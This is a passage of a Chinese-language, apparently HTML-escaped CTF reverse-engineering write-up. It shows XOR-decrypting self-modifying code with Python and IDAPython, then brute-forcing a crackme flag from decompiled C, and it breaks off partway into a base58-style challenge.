&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1045&lt;/span&gt;):
    smc[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; (ord(str[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]))

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1045&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;):
    file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fw.write(&amp;#39;&lt;/span&gt;)
    file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes(smc[i:i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;])&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在命令行中依次运行 &lt;code&gt;python solve.py&lt;/code&gt; 和 &lt;code&gt;python patch.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;会得到一个新的 exe 文件 &lt;code&gt;modify_天津垓.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 ida 中打开，进入之前解密的地址，发现此时已经可以被解析了&lt;/p&gt;
&lt;h4 id=&#34;法二-idapython-自动-patch&#34;&gt;法二（ idapython 自动 patch）&lt;/h4&gt;
&lt;p&gt;自己手动 patch 的好处在于可以避免直接对文件进行操作，如果出现错误不容易复原（毕竟 ida 7.0 没有撤销）。而利用 &lt;code&gt;idapython&lt;/code&gt; 的接口进行 patch 则写起来更加方便。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;patch&lt;/span&gt;(start, end):
    str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Caucasus@s_ability&amp;#39;&lt;/span&gt;
    addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; end &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        PatchByte(addr, Byte(addr) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(str[(addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]))
        addr &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果将 &lt;code&gt;str&lt;/code&gt; 取出作为变量的一部分，这段代码就可以通用到一些其他题目了。&lt;/p&gt;
&lt;p&gt;随后在 ida 的 &lt;code&gt;File &amp;gt; script file&lt;/code&gt; 中选择写好的脚本，在 &lt;code&gt;File &amp;gt; script command&lt;/code&gt; 中直接输入 &lt;code&gt;patch( &amp;lt;start_addr&amp;gt;, &amp;lt;end_addr&amp;gt;)&lt;/code&gt; 即可（具体的 &lt;code&gt;&amp;lt;addr&amp;gt;&lt;/code&gt; 可以直接从 ida 的汇编页面中读取）&lt;/p&gt;
&lt;p&gt;点击 &lt;code&gt;run&lt;/code&gt; 后即可 patch 成功。&lt;/p&gt;
&lt;h3 id=&#34;hijack&#34;&gt;hijack&lt;/h3&gt;
&lt;p&gt;查看上一步中成功解密的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_10040164D&lt;/span&gt;()
{
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2007666&lt;/span&gt;;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2125764&lt;/span&gt;;
  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1909251&lt;/span&gt;;
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2027349&lt;/span&gt;;
  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2421009&lt;/span&gt;;
  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1653372&lt;/span&gt;;
  v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2047032&lt;/span&gt;;
  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2184813&lt;/span&gt;;
  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2302911&lt;/span&gt;;
  v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2263545&lt;/span&gt;;
  v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1909251&lt;/span&gt;;
  v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2165130&lt;/span&gt;;
  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1968300&lt;/span&gt;;
  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2243862&lt;/span&gt;;
  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2066715&lt;/span&gt;;
  v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2322594&lt;/span&gt;;
  v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1987983&lt;/span&gt;;
  v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2243862&lt;/span&gt;;
  v27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1869885&lt;/span&gt;;
  v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2066715&lt;/span&gt;;
  v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2263545&lt;/span&gt;;
  v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1869885&lt;/span&gt;;
  v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;964467&lt;/span&gt;;
  v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;944784&lt;/span&gt;;
  v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;944784&lt;/span&gt;;
  v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;944784&lt;/span&gt;;
  v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;728271&lt;/span&gt;;
  v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1869885&lt;/span&gt;;
  v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2263545&lt;/span&gt;;
  v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2283228&lt;/span&gt;;
  v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2243862&lt;/span&gt;;
  v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2184813&lt;/span&gt;;
  v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2165130&lt;/span&gt;;
  v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2027349&lt;/span&gt;;
  v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1987983&lt;/span&gt;;
  v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2243862&lt;/span&gt;;
  v45 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1869885&lt;/span&gt;;
  v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2283228&lt;/span&gt;;
  v47 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2047032&lt;/span&gt;;
  v48 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1909251&lt;/span&gt;;
  v49 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2165130&lt;/span&gt;;
  v50 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1869885&lt;/span&gt;;
  v51 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2401326&lt;/span&gt;;
  v52 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1987983&lt;/span&gt;;
  v53 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2243862&lt;/span&gt;;
  v54 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2184813&lt;/span&gt;;
  v55 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;885735&lt;/span&gt;;
  v56 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2184813&lt;/span&gt;;
  v57 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2165130&lt;/span&gt;;
  v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1987983&lt;/span&gt;;
  v59 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2460375&lt;/span&gt;;
  strcpy(Format, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input the flag to hijack the ability of Hiden Intelligence:&amp;#34;&lt;/span&gt;);
  strcpy(v7, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Progrise Key confirmed. Ready to break.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  strcpy(v6, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Jacking Break! Zaia Enterprise.&amp;#34;&lt;/span&gt;);
  strcpy(v5, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%59s&amp;#34;&lt;/span&gt;);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29477&lt;/span&gt;;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  strcpy(v2, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not verified!&amp;#34;&lt;/span&gt;);
  v62 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2147483659&lt;/span&gt;;
  printf(Format);
  scanf(v5, Str);
  printf(v7);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( strlen(Str) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; )
  {
    printf(v2);
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  }
  v61 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19683&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    v60 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v61 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)Str[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; v62; &lt;span style=&#34;color:#75715e&#34;&gt;// 关键代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v60 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) ) &lt;span style=&#34;color:#75715e&#34;&gt;// 验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    {
      printf(v2);
      exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    }
  }
  printf(v6);
  getchar();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; getchar();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将关键代码美化一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v61 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Str[i] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; v62 )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要确保式子两端一直相等就行&lt;/p&gt;
&lt;p&gt;程序的输入部分还是存到了 Str 中，因此只需要通过已经定义好的数求出 Str 就可以&lt;/p&gt;
&lt;p&gt;这里直接对 Str 的每一位进行枚举（也可以用 z3 solver 或者求模逆等方法求解）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    v[ &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2007666&lt;/span&gt;;
    v[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2125764&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// 中间省略
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1987983&lt;/span&gt;;
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2460375&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v61 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19683&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; res &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;; res&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v61 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2147483659&lt;/span&gt;){
                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, res);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            }
        }
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;span style=&#34;color:#75715e&#34;&gt;// flag{Thousandriver_is_1000%_stronger_than_zero-one}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在程序中输入这个字符串后，就能看到如下输出&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Input the flag to hijack the ability of Hiden Intelligence:flag{Thousandriver_is_1000%_stronger_than_zero-one}
Progrise Key confirmed. Ready to break.
Jacking Break! Zaia Enterprise.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;说明我们破解成功了！&lt;/p&gt;
&lt;h2 id=&#34;fxck&#34;&gt;fxck!&lt;/h2&gt;
&lt;p&gt;在输出前经过了两个函数，猜测第一个是加密，第二个是验证&lt;/p&gt;
&lt;p&gt;看一下第一个函数，里面大概有两段代码是有用的&lt;/p&gt;
&lt;p&gt;第一段&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v10; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_v11[i];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v12; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j )
    {
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)v20[j] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
      v20[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58u&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v14 )
    {
      v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v12&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      v20[v4] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58u&lt;/span&gt;;
    }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二段&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;k )
    byte_602500[k] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; byte_602490[k &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)k;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; l &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v12; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;l )
